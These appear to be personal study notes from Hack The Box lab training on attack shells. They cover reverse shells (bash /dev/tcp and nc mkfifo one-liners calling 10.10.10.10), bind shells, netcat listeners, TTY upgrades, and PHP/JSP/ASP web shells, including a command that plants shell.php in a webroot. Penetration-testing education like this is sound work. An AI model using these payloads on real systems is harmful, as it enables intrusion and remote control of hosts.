# Shells

A #Shell is the #CLI interface that we use to execute commands on a system. Common shells include #BASH and #PowerShell, although there are many, many more. If we can open the shell of a system we are attacking, we won't have to continuously execute the same vulnerability for each action we take on the target device.

### Shell Types

#### Reverse Shell

Reverse Shells are the most common type and is the preferred method for infiltrating a compromised host. We can use a tool like #Netcat to perform port listening, which will enable us to execute a command via the reverse shell of the remote machine. We can listen to the ports for BASH and PowerShell to establish a reverse shell.

Reverse Shells are convenient and useful, however they are notably fragile and any stoppage or interruptions in connection result in us having to repeat the process to gain entry which consumes a lot of time and can raise alarm on the target machine.
##### Netcat

Netcat is a tool for listening to communications happening on ports. This listener will monitor the port for any pending connection, which allows us to execute a remote shell command to connect the target machine to our own.

We must submit our own IP to the netcat tool in order to have the reverse shell information returned to us.

We will use a few of the following netcat flags in our command - these are explained below:

- -l sets netcat to listening mode, which will monitor the port until a connection is initiated.
- -v indicates that we want a verbose response when the connection is established.
- -n is used to disable #DNS resolution and connect directly to the assigned #IP addresses.
- -p 1234 indicates that we will monitor the port 1234

The following command can then be used to begin port monitoring with netcat:

> nc -lvnp 1234

We must submit our own IP to the netcat tools in order to have the reverse shell forwarded to our client. We can list information related to our IP via the following command:

> ip a

In the case of this example, we will use the HTB #VPN  connection 'tun0' to reflect the listened port back to our machine. This is because the machines we are attacking are only available on the local HTB network and do not have direct access to the internet - we are connecting directly to the local machine via eth0 ethernet connections.

We will then need to initiate a reverse shell command, although these will be different depending on the #OS and version being used on the target. [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md "This is a list of shell commands for a range of hosts.")is a great source for various commands used to connect to remote hosts.

For Linux systems using #BASH, we can use the following command:

> bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'

> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f

For #Windows systems using #PowerShell, we can use the following command:

** see resource - VERY long command **

Once these commands are issued, you will be able to use the command we started listening with to observe our received connection:

> nc -lvnp 1234

This should allow you to execute commands on the remote machine and see the output on our own machine.

#### Bind Shell

A Bind Shell means that we are connecting to the target's listening ports, instead of reflecting the listening port back to our client. In these cases we are binding the hosts shell to the to the listening port on the host. We then connect to that port with #Netcat to execute commands on the host shell.

Bind shell is a more stable method of attack that will allow us to easily reconnect if the connection is dropped, unlike reverse shells.

If we want to exploit a #Linux system using #BASH, we use the following command:

> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f

For python or PowerShell execution techniques, please see the source material as these are very long.

Once we use these commands to execute bind shell, we can listen to the port via netcat to gain access to this shell:

> nc 10.10.10.1 1234

This will open up the shell so we can execute commands.

#### TTY Updating

#TTY prints the name of a terminal you are interacting with.

When we are accessing a remote shell using the methods above, we will have limited function within the #CLI. We will not be able to navigate the cursor, we will only be able to enter characters and delete them. In order to gain more granular control over the shell we will need to map our own TTY to the TTY on the target system.

We can use python/stty to upgrade our shell to a fully functioning TTY:

> python -c 'import pty; pty.spawn("/bin/bash")'

We enter this command to upgrade the target hosts TTY - we can then minimize our target's shell and observe our client terminal with Ctrl - Z before submitting additional commands. It should look something like the following:

>  ^\Z
> stty raw -echo
> fg

The fg command will return our target shell to the foreground of our interface. Pressing Enter will then bring us back to the target shell. Alternatively we can submit 'reset' to return to the target shell.

This should enable a shell with full functions, however the size of the terminal presented might not be desirable. We can identify a few variables that will allow us to resize windows on the target system to our desired size.

Open a new terminal and submit the following commands to determine these variables:

> echo \$TERM

> stty size

These will display the TERM variable and the second command displays the amount of rows and columns in the related system.

Now return to the netcat shell in the original terminal we opened. We can correct our variables so that our client settings match the target hosts' settings:

> export TERM=xterm-256color

> stty rows 67 columns 318

If all of the above goes correctly, you should be able to interact with the target host as if you have a true #SSH connection.

#### Web Shell

A Web Shell uses a browser to send commands via #HTTP request parameters like #GET and #POST via languages like #PHP or #ASPX to execute web scripts. Web shells are useful as they bypass the #firewall, do not use ports other than port 80 or port 443, and persist even after a target host is rebooted. These shells are limited in their capabilities compared to reverse and bind shells however. We also have to continuously request new URL submissions to continue using web shells, although #Python can be used to automate the generation of these new URLs.

You must write a web shell that can submit commands through GET requests, execute those commands, and return the output to our client. 

Some common and useful web shell scripts include:

For PHP:

> \<?php system(\$\_REQUEST\["cmd"]); ?>

For JSP:

> \<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

For ASP:

> <% eval request("cmd") %>

The above scripts must be executed through the web browser and placed within the target host's web directory. It is likely that this must be done through an existing vulnerability. After placing it in the web directory, we must upload the script and access this uploaded file to begin execution of scripts.

A #Webroot is the web directory. Once our file is in the Webroot and we have identified the location of the Webroot, we can now access it over the internet.

Common Servers and their associated Webroots include:

| Server | Webroot                |
| ------ | ---------------------- |
| Apache | /var/www/html/         |
| Nginx  | /usr/local/nginx/html/ |
| IIS    | c:\\inetpub\\wwwroot\\ |
| XAMPP  | C:\\xampp\\htdocs\\                       |

If we search for these directories on a target host, we can determine which Webroot is being used and echo the location to send our web shell script to the desired directory:

> echo '\<?php system(\$\_REQUEST\["cmd"]); ?>' > /var/www/html/shell.php

This will write our web shell script to the directory, which can now be accessed via #cURL or by visiting the page index of /shell.php. We add /shell.php?cmd=id to the end of the URL we use to connect to the remote host. 

This #URL input would look something like the following:

> \http://SERVER_IP:PORT/shell.php?cmd=id

The cURL input would be:

> curl \http://SERVER_IP:PORT/shell.php?cmd=id

